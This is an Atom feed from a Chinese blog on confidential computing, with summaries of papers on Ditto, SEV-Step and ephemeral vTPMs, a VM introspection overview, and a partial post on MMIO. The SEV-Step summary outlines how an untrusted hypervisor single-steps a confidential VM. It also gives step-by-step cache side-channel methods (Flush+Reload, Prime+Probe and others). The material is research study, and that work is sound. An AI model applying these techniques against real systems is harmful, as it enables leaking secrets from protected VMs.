<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lordaeron_ESZ&#39;s blog</title>
  
  <subtitle>代码-游戏-数码-技术</subtitle>
  <link href="http://lordaeronesz.github.io/atom.xml" rel="self"/>
  
  <link href="http://lordaeronesz.github.io/"/>
  <updated>2025-07-10T14:54:40.232Z</updated>
  <id>http://lordaeronesz.github.io/</id>
  
  <author>
    <name>Chaoqun Zheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>论文《Ditto：Elastic Confidential VMs with Secure and Dynamic CPU Scaling》总结</title>
    <link href="http://lordaeronesz.github.io/2025/07/10/%E8%AE%BA%E6%96%87%E3%80%8ADitto%EF%BC%9AElastic%20Confidential%20VMs%20with%20Secure%20and%20Dynamic%20CPU%20Scaling%E3%80%8B%E6%80%BB%E7%BB%93/"/>
    <id>http://lordaeronesz.github.io/2025/07/10/%E8%AE%BA%E6%96%87%E3%80%8ADitto%EF%BC%9AElastic%20Confidential%20VMs%20with%20Secure%20and%20Dynamic%20CPU%20Scaling%E3%80%8B%E6%80%BB%E7%BB%93/</id>
    <published>2025-07-10T15:30:11.000Z</published>
    <updated>2025-07-10T14:54:40.232Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍 2024 年发表在 arXiv 上的论文《DITTO：Elastic Confidential VMs with Secure and Dynamic CPU Scaling》。</p><span id="more"></span><h1 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h1><p>机密虚拟机（CVM）在带来了强大的机密性和完整性保护的同时，也带来了很多限制，导致虚拟机的性能和灵活性的下降。例如：不支持 vCPU 的热插拔（即运行中动态调整 vCPU 的数量），该特性可以用于在虚拟机运行过程中灵活调整计算能力，应用于 Serverless 等计算环境下。</p><blockquote><p>虽然的商用 CVM 方案还没有任何一家支持 vCPU 热插拔，但是内存的动态调整是可行的。例如 AMD SEV-SNP 下 hypervisor 可以使用 <code>RMPUPDATE</code> 指令将 CVM 的内存进行回收和动态分配。</p></blockquote><p>由于缺少了 vCPU 数量的动态调整能力，现有的机密无服务器环境（OpenWhisk + Kubernetes + 机密容器）要想动态调整运算能力，只能借助于启动新的 CVM，这会带来很大的性能开销。本文提出了“弹性 CVM” 和 “Woker vCPU” 的概念，能够在 CVM 环境下动态调整参与计算的 vCPU 数量。具体来说，本文的主要贡献如下：</p><ul><li><strong>弹性 CVM 的概念：</strong> 利用 CVM 和 hypervisor 的协同来动态调整 CPU 资源的分配，增强 CVM 的效率。</li><li><strong>创新的 Worker vCPU 设计：</strong> Worker vCPU 是一种特殊的 vCPU，通过与 hypervisor 协同的方式被调度，能够随着工作负载的变化而在休眠和工作状态间转变。</li><li><strong>Worker vCPU 抽象层：</strong> 用于简化对 Worker vCPU 的操作。</li><li><strong>Ditto 原型开发和实验评估：</strong> Ditto 是使用了 Worker vCPU 设计的机密 Serverless 平台，能够实现安全且自动扩展的 Serverless 环境。实验评估表明 Ditto 在资源利用上相较于现有的机密 Serverless 平台有显著提升。</li></ul><h1 id="设计与实现"><a href="#设计与实现" class="headerlink" title="设计与实现"></a>设计与实现</h1><h2 id="Worker-vCPU"><a href="#Worker-vCPU" class="headerlink" title="Worker vCPU"></a>Worker vCPU</h2><p>Woker vCPU 的架构图如下所示：</p><p><img src="/2025/07/10/%E8%AE%BA%E6%96%87%E3%80%8ADitto%EF%BC%9AElastic%20Confidential%20VMs%20with%20Secure%20and%20Dynamic%20CPU%20Scaling%E3%80%8B%E6%80%BB%E7%BB%93/Ditto1.png" alt></p><p>Worker vCPU 的状态分为活跃和休眠，设计目标是根据系统负载的变化而动态改变 Woker vCPU 的状态。</p><p>为了实现的简单和减少 CVM 内 TCB（可信计算基） 的大小，作者选择将对 Worker vCPU 的调度策略放在了 hypervisor 中，而不是由 CVM 内部来决定。而 hypervisor 对 CVM 内部执行情况的了解是很有限的，因此 Worker vCPU 的调度需要 CVM 与 hypervisor 在不损害安全性的前提下完成，且适用的场景没有那么广。主要适用场景为：事件驱动系统和生产者-消费者模型（无状态和松耦合线程），例如 HTTP 请求的发送和处理、数据库查询的请求和处理。这些请求的处理相对独立，能够动态调整计算资源。</p><p>初始化 CVM 时，需要指定普通的 vCPU 数量 $m$ 和最大的 Woker vCPU 数量 $n$ ，Woker vCPU 在 CPU 硬件看来与 vCPU 无异，但是为了实现动态运行时调整，CVM 内核和 hypervisor 都必须能够对此进行区分。例如，可以将 $vCPU[1, m]$ 看作是普通 vCPU， $vCPU[m + 1, m + n]$ 看作是 Woker vCPU，CVM 在启动应用时将特定的工作线程绑定到特定的 Woker vCPU 上。</p><p>由于 CVM 下虚拟机内部的运行状态对 hypervisor 来说是不可见的（SEV 的内存加密和 SEV-ES 的寄存器状态加密），因此 CVM 与 hypervisor 的协同很重要。例如：Worker vCPU 可以在执行完一个任务后，主动向 hypervisor 发送 “check-in” 的信号，表明一个任务已完成，hypervisor 受到信号后便可以决定要不要将 Worker vCPU 置为休眠状态。之所以需要这样的协同，是为了防止 hypervisor 在一个任务执行中途将 Worker vCPU 置为休眠，导致任务执行被推迟。</p><h2 id="Ditto"><a href="#Ditto" class="headerlink" title="Ditto"></a>Ditto</h2><p>Ditto 的架构图如下所示：</p><p><img src="/2025/07/10/%E8%AE%BA%E6%96%87%E3%80%8ADitto%EF%BC%9AElastic%20Confidential%20VMs%20with%20Secure%20and%20Dynamic%20CPU%20Scaling%E3%80%8B%E6%80%BB%E7%BB%93/Ditto2.png" alt></p><p>Ditto 相较于传统的 Kata 容器的部署过程，存在下列主要不同：</p><ul><li><strong>启动 CVM：</strong> 以 $m$ 个普通 vCPU 和 $n$ 个 Worker vCPU 进行初始化。</li><li><strong>Worker vCPU 注册：</strong> 应用启动时需要将特定的线程注册到 Worker vCPU 上，且保持不变，同时还不允许其运行内核函数，因此 Worker vCPU 可以被安全的启用和睡眠，不会影响整体系统的正常工作，只会影响效率。</li></ul><h3 id="Worker-vCPU-调度"><a href="#Worker-vCPU-调度" class="headerlink" title="Worker vCPU 调度"></a>Worker vCPU 调度</h3><p>调度器依赖于两个方面： <strong>观察指标和调度算法</strong> 。</p><p>在 CVM 环境下，hypervisor 的观察指标很有限。在 Ditto 中，作者主要基于 Linux 内核数据结构 <code>task_struct</code> 的时间信息来计算一个采样周期内 vCPU 运行的时间来计算工作负载量。</p><blockquote><p>这里信息的获取方式不太明白。</p></blockquote><p>其他一些可能的指标还有：HTTP 请求的数量、每个请求的近似处理时间等。</p><p>调度算法方面，作者采用了一个简单的策略：当活跃的 vCPU 的总负载达到一个预先设定的阈值后，就唤醒一个 Worker vCPU，活跃的 vCPU 的总负载降低过一个预先设定的阈值后，就睡眠一个 Worker vCPU。注意如前文所述，需要在接收到 <code>CHECKIN</code> 请求后才能睡眠，防止中断任务执行。如果所有的 Worker vCPU 都不足以应对工作负载，可以考虑启动新的 CVM。</p><h3 id="运行时控制"><a href="#运行时控制" class="headerlink" title="运行时控制"></a>运行时控制</h3><p>为了方便实现对 Worker vCPU 的动态控制，需要定义一套的 CVM-hypervisor 通信协议。通信基于预先定义的 <code>CPUID</code> 实现。在 SEV-ES 中，<code>CPUID</code> 指令会触发 <code>#VC</code> 异常，会陷入到 guest 内核的 VC 处理程序中，执行必要的检查，并将需要向 hypervisor 提供的信息（信息类型和信息参数等）通过共享的 GHCB 内存块传递，并退出虚拟机回到 hypervisor 进行处理。下图是作者定义的一个简单的通讯协议：</p><p><img src="/2025/07/10/%E8%AE%BA%E6%96%87%E3%80%8ADitto%EF%BC%9AElastic%20Confidential%20VMs%20with%20Secure%20and%20Dynamic%20CPU%20Scaling%E3%80%8B%E6%80%BB%E7%BB%93/Ditto3.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍 2024 年发表在 arXiv 上的论文《DITTO：Elastic Confidential VMs with Secure and Dynamic CPU Scaling》。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="机密计算" scheme="http://lordaeronesz.github.io/tags/%E6%9C%BA%E5%AF%86%E8%AE%A1%E7%AE%97/"/>
    
    <category term="虚拟化" scheme="http://lordaeronesz.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>论文《SEV-Step：A Single-Stepping Framework for AMD-SEV》总结</title>
    <link href="http://lordaeronesz.github.io/2025/07/05/%E8%AE%BA%E6%96%87%E3%80%8ASEV-Step%20A%20Single-Stepping%20Framework%20for%20AMD-SEV%E3%80%8B%E6%80%BB%E7%BB%93/"/>
    <id>http://lordaeronesz.github.io/2025/07/05/%E8%AE%BA%E6%96%87%E3%80%8ASEV-Step%20A%20Single-Stepping%20Framework%20for%20AMD-SEV%E3%80%8B%E6%80%BB%E7%BB%93/</id>
    <published>2025-07-05T15:30:11.000Z</published>
    <updated>2025-07-05T12:38:07.224Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍发表在 arXiv 上的论文《SEV-Step: A Single-Stepping Framework for AMD-SEV》。</p><span id="more"></span><h1 id="文章贡献"><a href="#文章贡献" class="headerlink" title="文章贡献"></a>文章贡献</h1><ul><li>在 SEV 环境下引入了可靠（reliable）的单步执行方法。</li><li>将交互式单步执行、页面错误追踪和基于缓存组置换的缓存攻击（eviction set-based cache attacks）整合到一个可复用的框架中。</li></ul><h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="基于中断的单步执行"><a href="#基于中断的单步执行" class="headerlink" title="基于中断的单步执行"></a>基于中断的单步执行</h2><p>基于中断的单步执行方法是一种通过控制处理器中断（如 APIC 时钟中断）来提升微架构攻击的时间分辨率（temporal resolution）的技术。核心思想是利用高频率的中断强制目标程序暂停执行，从而实现对微架构状态（如缓存等）的细粒度观测。</p><p>APIC 提供了高精度的定时功能，攻击者可以通过配置定时器周期性触发中断，强制目标程序在执行过程中频繁暂停。暂停后，攻击者可以利用侧信道攻击等方法，读取此时的微架构状态，再恢复下一条指令执行。这种方式将时间分辨率从页错误级别提升到了指令级。</p><h2 id="缓存侧信道攻击"><a href="#缓存侧信道攻击" class="headerlink" title="缓存侧信道攻击"></a>缓存侧信道攻击</h2><blockquote><p>下列内容主要来自《操作系统：原理与实现》（银杏书）的在线章节：操作系统安全的 16.6.2 节。</p></blockquote><p>缓存侧信道是利用时间信息推断程序执行中缓存的行为，进而推断出程序中的关键信息。</p><h3 id="Flush-Reload"><a href="#Flush-Reload" class="headerlink" title="Flush + Reload"></a>Flush + Reload</h3><p><code>Flush + Reload</code> 方法思路是：<strong>假设攻击进程和目标进程共享一块内存</strong> ，攻击者的目标是想知道目标进程是否访问了这块共享内存中的某个变量。</p><blockquote><p>共享内存如果不存在，需要事先构造，构造方法在此不做介绍。</p></blockquote><p>具体步骤如下：</p><ol><li>攻击进程首先将 cache 清空，方法是不断访问其他内存，用其他内存的数据填满 cache，或直接通过 <code>flush</code> 指令将 cache 清空；</li><li>等待目标进程执行；</li><li>攻击进程访问共享内存中的某个变量，并记录访问的时间：若时间长，则表示 cache miss，意味着目标进程在第二步中没有访问过该变量；若时间短，则表示 cache hit，意味着目标进程在第二步中访问过该变量。</li></ol><h3 id="Flush-Flush"><a href="#Flush-Flush" class="headerlink" title="Flush + Flush"></a>Flush + Flush</h3><p><code>Flush + Flush</code> 方法思路是基于缓存刷新时间（如 <code>cflush</code>）来推测数据在缓存中的状态，进而推断出程序之前的执行行为。若数据在缓存中，则 <code>cflush</code> 执行时间相比不在缓存中更长。具体步骤如下：</p><ol><li>攻击进程首先将 cache 清空；</li><li>等待目标进程执行；</li><li>再次清空不同的缓存区域，若时间较短说明缓存中无数据，时间较长则说明缓存中有数据，意味着目标进程曾经访问过对应的内存。</li></ol><h3 id="Prime-Probe"><a href="#Prime-Probe" class="headerlink" title="Prime + Probe"></a>Prime + Probe</h3><p><code>Prime + Probe</code> 和 <code>Flush + Reload</code> 类似，但是 <strong>无需共享内存的支持</strong> 。具体步骤如下：</p><ol><li>攻击进程用自己的数据将 cache set 填满（Prime）；</li><li>等待目标进程执行；</li><li>再次访问自己的数据，若时间很短，表示 cache hit，说明目标进程没有将该数据 evict，推导出目标进程没有访问过某个关键数据，反之则说明目标进程访问了某个关键数据。</li></ol><h3 id="Evict-Reload"><a href="#Evict-Reload" class="headerlink" title="Evict + Reload"></a>Evict + Reload</h3><p>与 <code>Prime + Probe</code> 方法不同的是，<code>Evict + Reload</code> 先执行目标进程，之后将  cache set 中的数据清出去，之后再次执行目标进程。比较两次执行的时间，从而得出关键数据是否被访问到。</p><p>具体步骤如下：</p><ol><li>等待目标进程执行，并测量执行时间；</li><li>将关键数据所在的 cache set 都替换成攻击进程的数据；</li><li>再次执行目标进程，并测量执行时间。若时间较短，表示 cache  hit，说明攻击进程 evict 的数据没有被目标进程访问，推导出目标进程没有访问过某个关键数据，反之则说明目标进程访问了某个关键数据。</li></ol><h1 id="设计与实现"><a href="#设计与实现" class="headerlink" title="设计与实现"></a>设计与实现</h1><p>SEV-Step 的架构图如下所示：</p><p><img src="/2025/07/05/%E8%AE%BA%E6%96%87%E3%80%8ASEV-Step%20A%20Single-Stepping%20Framework%20for%20AMD-SEV%E3%80%8B%E6%80%BB%E7%BB%93/step1.png" alt></p><h2 id="设计目标"><a href="#设计目标" class="headerlink" title="设计目标"></a>设计目标</h2><p>设计目标包括：交互性（interactivity）和可复用性（reusability）。</p><p>交互性要求 SEV-Step 不仅能够中断虚拟机的执行，而且要能够在中断时通知攻击者，并在攻击者完成相应的操作（如缓存侧信道攻击）前暂停虚拟机的执行。</p><p>可复用性要求 SEV-Step 将对虚拟机的单步执行与具体的攻击方法解耦，能够被多种攻击方法所适用。</p><h2 id="单步执行"><a href="#单步执行" class="headerlink" title="单步执行"></a>单步执行</h2><p>单步执行成功的关键在于配置合适的 APIC 时钟周期，既不能太长也不能太短：太长将导致每次中断可能有多条指令被执行，使得“单步执行”的粒度变粗；太短将导致虚拟机在未执行第一条的情况下就被中断，造成零步现象（zero-step）。</p><p><img src="/2025/07/05/%E8%AE%BA%E6%96%87%E3%80%8ASEV-Step%20A%20Single-Stepping%20Framework%20for%20AMD-SEV%E3%80%8B%E6%80%BB%E7%BB%93/step2.png" alt></p><p>为了实现可靠的单步操作，作者采用了下列方法：</p><h3 id="增大单步窗口"><a href="#增大单步窗口" class="headerlink" title="增大单步窗口"></a>增大单步窗口</h3><p>为了能够有足够的粒度找到合适的时钟配置，单步的窗口应该尽可能大。</p><p>作者选择每次调度虚拟机执行前，清空虚拟机的 TLB 条目，并清除包含第一条指令的页表条目的访问位（accessed bit），尽可能增大从 VMRUN 到第一条指令开始执行的窗口。</p><p>同时，为了系统速度的稳定。作者还做了下列工作：</p><ul><li>将运行虚拟机的内核线程固定到特定的 CPU 核心，该核心不运行其他线程。</li><li>通过 BIOS 或者 Linux 的 <code>cpufreq</code> 子系统固定 CPU 频率。</li><li>禁用硬件缓存预取。</li></ul><blockquote><p>因为机密虚拟机的威胁模型中，特权软件属于不可信的范畴，因此上述操作都是可行的。</p></blockquote><h3 id="阻止虚拟时钟中断"><a href="#阻止虚拟时钟中断" class="headerlink" title="阻止虚拟时钟中断"></a>阻止虚拟时钟中断</h3><p>在正常的虚拟机中，在每次宿主机的时钟中断触发后，hypervisor 都需要向虚拟机注入虚拟时钟中断，以实现对虚拟机时钟中断的模拟。但是这将导致虚拟机运行后转到自己的时钟中断处理程序执行，与我们想要攻击用户态程序的目标相悖，因此需要对其进行禁用。</p><p>但是时钟中断对于正常的操作系统来说至关重要，是任务调度的时间指标来源，因此如果虚拟机长时间没有时钟中断可能导致一些问题，还需要定期进行注入。</p><h3 id="确定步长大小"><a href="#确定步长大小" class="headerlink" title="确定步长大小"></a>确定步长大小</h3><p>为了迭代 APIC 时钟周期以确定是否成功实现了单步，还需要确定本次虚拟机执行与上次虚拟机执行间执行的指令数量。</p><p>观察页表的访问位是一种方法，但是它确定页面是被访问或是没有被访问，无法确定访问次数。作者还使用了另外一种方法：观察虚拟机的性能计数器事件。</p><blockquote><p>有关性能计数器事件，在 IEEE SP ‘22 论文 <em>A systematic look at ciphertext side channels on AMD SEV-SNP</em> 中有介绍。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍发表在 arXiv 上的论文《SEV-Step: A Single-Stepping Framework for AMD-SEV》。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="机密计算" scheme="http://lordaeronesz.github.io/tags/%E6%9C%BA%E5%AF%86%E8%AE%A1%E7%AE%97/"/>
    
    <category term="虚拟化" scheme="http://lordaeronesz.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>论文《Remote attestation of confidential VMs using ephemeral vTPMs》总结</title>
    <link href="http://lordaeronesz.github.io/2025/06/28/%E8%AE%BA%E6%96%87%E3%80%8ARemote%20attestation%20of%20confidential%20VMs%20using%20ephemeral%20vTPMs%E3%80%8B%E6%80%BB%E7%BB%93/"/>
    <id>http://lordaeronesz.github.io/2025/06/28/%E8%AE%BA%E6%96%87%E3%80%8ARemote%20attestation%20of%20confidential%20VMs%20using%20ephemeral%20vTPMs%E3%80%8B%E6%80%BB%E7%BB%93/</id>
    <published>2025-06-28T15:30:11.000Z</published>
    <updated>2025-06-30T06:57:49.158Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对 <code>ACSAC &#39;23</code> 论文《Remote attestation of confidential VMs using ephemeral vTPMs》的总结，以及个人的理解和思考。</p><span id="more"></span><h1 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h1><p>机密虚拟机（CVM）技术为虚拟机提供一个隔离环境，防止受到 hypervisor 等高特权软件的干扰。但是这样的隔离机制作用于虚拟机运行时，在虚拟机启动过程中，此时的完整性（intergrity）保护依赖于度量启动（measured boot）和运行时证明（runtime attestation）。运行时证明需要一个硬件信任根，在物理机上，TPM 芯片可以作为这样的信任根。然而在云计算环境中，云服务提供商通过设备模拟的方式给用户提供 vTPM，使用这样的模拟设备需要信任云服务提供商，这与 CVM 的威胁模型不符。</p><p>本文作者提出了一种方法，借助 AMD SEV-SNP 技术，在 CVM 内部模拟一个 vTPM，而无需信任 hypervisor。具备以下安全要求：</p><ul><li>隔离性：既与 guest 隔离又与 host 隔离。</li><li>安全通信：与物理 TPM 的通信是硬件级隔离的，因此 vTPM 的通信也必须是安全的。</li><li>持久化状态：物理 TPM 的状态在设备被制造时确定并受到硬件保护，vTPM 的状态应该应该由云租户来保存，与云服务提供商隔离。</li></ul><h1 id="设计与实现"><a href="#设计与实现" class="headerlink" title="设计与实现"></a>设计与实现</h1><p>SVSM-vTPM 的架构图和组件构成如下：</p><p><img src="/2025/06/28/%E8%AE%BA%E6%96%87%E3%80%8ARemote%20attestation%20of%20confidential%20VMs%20using%20ephemeral%20vTPMs%E3%80%8B%E6%80%BB%E7%BB%93/svsm.png" alt></p><h2 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h2><p>作者利用了 SEV-SNP 所引入的 VMPL 机制：基于 AMD 官方的 VMPL0 管理程序：SVSM 进行扩展，来同时实现与 guest 与 host 的隔离。其中，由于 vTPM 涉及到一些对时钟、随机数生成和加密库的需求，而 SVSM 又是一个裸金属（bare-metal）程序，需要手动移植一些库函数。</p><h2 id="安全通信"><a href="#安全通信" class="headerlink" title="安全通信"></a>安全通信</h2><p>在 CVM 环境中用一块专门的内存空间（如一个页面）来完成 guest 内核与 vTPM 的通信：每当 guest 内核需要向 vTPM 发送请求时，就向该页面中写入数据，然后将触发虚拟机退出到 hypervisor，hypervisor 调度 VMPL0 的状态执行，VMPL0 中的 SVSM-vTPM 处理程序根据 CVM 的命令进行相应的响应。</p><p>上述通信过程的安全性由 SEV-SNP 特性所保证：guest 内核和 SVSM-vTPM 同属一个 CVM 环境中，内存是共享的，而对于 hypervisor 来说是加密的。因此即便 guest 内核与 SVSM-vTPM 的切换需要经过 hypervisor，这个过程仍然是安全的。而且 SEV-SNP 的硬件特性还确保了 hypervisor 在恢复虚拟机执行时只能恢复到 VMPL0 的上下文，从而防止 hypervisor 抑制 guest 内核发送的 TPM 请求，除非它让整个虚拟机都停止工作。</p><h2 id="持久化状态"><a href="#持久化状态" class="headerlink" title="持久化状态"></a>持久化状态</h2><p>与物理 TPM 将它的状态保存在芯片内部的非易失性存储器不同，vTPM 必须依赖于一个磁盘中的文件（以下称为 NV 文件）来实现这样的持久化，并且与 vTPM 的模拟软件一样，NV 文件也必须位于可信环境中。</p><p>一种实现方式是：对 NV 文件进行加密，并由用户保存密钥，依赖于 CVM 安全启动机制，在 CVM 启动阶段进行注入。但这会带来一定的系统复杂性。</p><p>作者使用了一种更为简单实用的做法：短时 vTPM（Ephemeral vTPM）。该 vTPM 会在每次启动时创建新的种子和密钥，无需存储持久化的状态。</p><blockquote><p>无持久状态的短时 vTPM 应用场景受限，对于那些需要跨重启周期使用相同密钥的应用场景（例如全盘加密、数据密封等），短时 vTPM 可能无法直接满足需求。</p></blockquote><h3 id="全盘加密"><a href="#全盘加密" class="headerlink" title="全盘加密"></a>全盘加密</h3><p>全盘加密（Full disk encryption, FDE）通过加密的方式保护磁盘数据，而加密密钥本身也需要进行加密并持久化保存，对磁盘密钥的加密通常由 TPM 中的存储根密钥（Storage root key, SRK）来完成。</p><p>而在短时 vTPM 中，没有持久化的 SRK，因此不能用传统方法实现 FDE。</p><p><img src="/2025/06/28/%E8%AE%BA%E6%96%87%E3%80%8ARemote%20attestation%20of%20confidential%20VMs%20using%20ephemeral%20vTPMs%E3%80%8B%E6%80%BB%E7%BB%93/svsm2.png" alt></p><p>作者实现基于短期的 eSRK 密钥实现对持久化磁盘密钥的保护所提出的方法，个人并没有太理解。疑惑的点在于：K<sub>isk</sub> 是不是依据某种算法稳定生成的（每次都相同）？否则如何利用它来将固定的磁盘密钥 D<sub>k</sub> 进行解密？上次运行时用 eSRK<sub>pub</sub> 进行加密的 K<sub>isk</sub>，如何能在本次运行时用 eSRK<sub>priv</sub> 进行解密？</p><p>这部分内容可能得等对 TPM 有一个更深入的理解后才能解答。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文是对 &lt;code&gt;ACSAC &amp;#39;23&lt;/code&gt; 论文《Remote attestation of confidential VMs using ephemeral vTPMs》的总结，以及个人的理解和思考。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="机密计算" scheme="http://lordaeronesz.github.io/tags/%E6%9C%BA%E5%AF%86%E8%AE%A1%E7%AE%97/"/>
    
    <category term="虚拟化" scheme="http://lordaeronesz.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机自省技术</title>
    <link href="http://lordaeronesz.github.io/2025/06/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%87%AA%E7%9C%81%E6%8A%80%E6%9C%AF%E4%BA%86%E8%A7%A3/"/>
    <id>http://lordaeronesz.github.io/2025/06/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%87%AA%E7%9C%81%E6%8A%80%E6%9C%AF%E4%BA%86%E8%A7%A3/</id>
    <published>2025-06-15T15:30:11.000Z</published>
    <updated>2025-06-15T15:09:11.299Z</updated>
    
    <content type="html"><![CDATA[<p>虚拟机自省技术（Virtual Machine Introspection）是一种通过外部监控虚拟机内部状态的技术，它能够在不依赖虚拟机内运行的软件的情况下，获取和分析虚拟机的内存、CPU 状态、磁盘活动、网络流量等数据。</p><span id="more"></span><p>以下是维基百科中对虚拟机自省技术的描述，我对其进行了中文翻译：</p><blockquote><p><strong>原文链接：</strong> <a href="https://en.wikipedia.org/wiki/Virtual_machine_introspection">Virtual machine introspection - Wikipedia</a></p><p>在计算机领域，虚拟机自省（Virtual Machine Introspection, VMI）是一种监控虚拟机运行状态的技术，这有助于调试和取证分析（forensic analysis）。</p><p><em>introspection</em> 这个术语由 Garfinkel 和 Rosenblum 引入虚拟机领域。他们发明了一种“保护安全应用程序免受恶意软件攻击”的方法，并将其称为 VMI。如今 VMI 是不同的虚拟机取证和分析方法的通用术语。基于 VMI 的方法广泛用于安全应用程序、软件调试和系统管理。</p><p>VMI 工具可以位于虚拟机内部或外部，并通过跟踪事件（中断、内存写入等）或向虚拟机发送请求来工作。虚拟机监视器通常提供底层信息，如内存的原始字节。将这种底层视图转换为对用户有意义的内容也就是所谓的“语义鸿沟”问题。解决这个问题需要分析和理解被监视的系统。</p><p><strong>虚拟机内的 VMI</strong></p><p>运行在虚拟机内部的程序可以提供其他进程的信息。这些信息可以通过网络接口或一些虚拟设备（如串口）发送。虚拟机内自省程序比如 WinDbg 或者与远程调试器交互的 GDB 服务器。</p><p>这种方法的缺点是它需要在虚拟机内中运行一个正常的 OS。如果 OS 挂起或尚未加载，那么自省代理（agent）也无法工作。</p><p><strong>虚拟机外的 VMI</strong></p><p>VMI 工具可以在虚拟机监视器内实现，也可以作为从虚拟机监视器捕获信息（例如内存数据）的单独程序实现。然后，必须对这些数据进行解释，以了解系统实际执行的过程。解释工具中一个比较流行的是 Volatility framwork。该框架能够支持很多主流的操作系统，并从中提取不同的信息，比如进程树和内核对象列表。</p></blockquote><p>主流的 VMI 工具如下：</p><ul><li>LibVMI：开源库（支持主流的虚拟化方案：Xen/KVM/VMware），提供统一的 API 读取虚拟机内存、寄存器，并支持符号解析（如从内存中提取 Windows 的 <code>EPROCESS</code> 结构）。</li><li>Volatility：内存取证框架，可与 VMI 结合分析虚拟机内存快照（如检测恶意进程）。</li><li>DRAKVUF：动态分析工具，通过注入恶意代码并监控虚拟机行为，用于沙箱检测。</li><li>GRR（Google Rapid Response）：结合 VMI 实现远程取证和响应。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;虚拟机自省技术（Virtual Machine Introspection）是一种通过外部监控虚拟机内部状态的技术，它能够在不依赖虚拟机内运行的软件的情况下，获取和分析虚拟机的内存、CPU 状态、磁盘活动、网络流量等数据。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="虚拟化" scheme="http://lordaeronesz.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>MMIO和mmap文件映射的区别</title>
    <link href="http://lordaeronesz.github.io/2025/05/16/MMIO%E5%92%8Cmmap%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>http://lordaeronesz.github.io/2025/05/16/MMIO%E5%92%8Cmmap%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E7%9A%84%E5%8C%BA%E5%88%AB/</id>
    <published>2025-05-16T15:30:11.000Z</published>
    <updated>2025-05-17T16:32:28.590Z</updated>
    
    <content type="html"><![CDATA[<p>MMIO 和 mmap 文件映射都涉及将外部资源（除 CPU 寄存器和内存以外）映射到进程的地址空间中，但它们并非等同。本文将对二者进行分别介绍，并对比它们之间的区别和联系。</p><span id="more"></span><h1 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h1><p>计算机系统中的设备种类繁多，不同设备它们的物理结构、电气特性可能完全不同。因此为了屏蔽其中的差异，让 CPU 更好的与不同的设备进行交互，各种不同的设备都被抽象成了一系列的外部接口，也就是 <strong>设备寄存器</strong> 。CPU 与设备交互的方式，就是对这些寄存器进行读写。</p><p>那么问题自然应运而生，以什么样的方式，或者更具体地说，执行什么样的指令对设备寄存器进行读写？通常来说有两种：一种是 CPU 采用特殊的 I/O 指令（如 x86 架构下的 <code>in/out</code> 指令），指令中对应的设备寄存器地址位于一片专门的 I/O 地址空间中，这种方式成为端口映射 I/O（Port-Mapped I/O, PMIO）；而另一种则是将设备寄存器的地址映射到进程的虚拟地址空间中，进而直接使用普通的内存读写指令（如 x86 架构下的 <code>mov</code>）对其进行读写，这种方式称为内存映射 I/O（Memory-Mapped I/O），也就是本文要介绍的 MMIO。</p><p>在 Linux 内核驱动代码中，通常使用 <code>ioremap</code> 来进行 MMIO 的映射：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __iomem <span class="token operator">*</span>regs <span class="token operator">=</span> <span class="token function">ioremap</span><span class="token punctuation">(</span>phys_addr<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 写入硬件寄存器</span><span class="token function">writel</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> regs <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="mmap-文件映射"><a href="#mmap-文件映射" class="headerlink" title="mmap 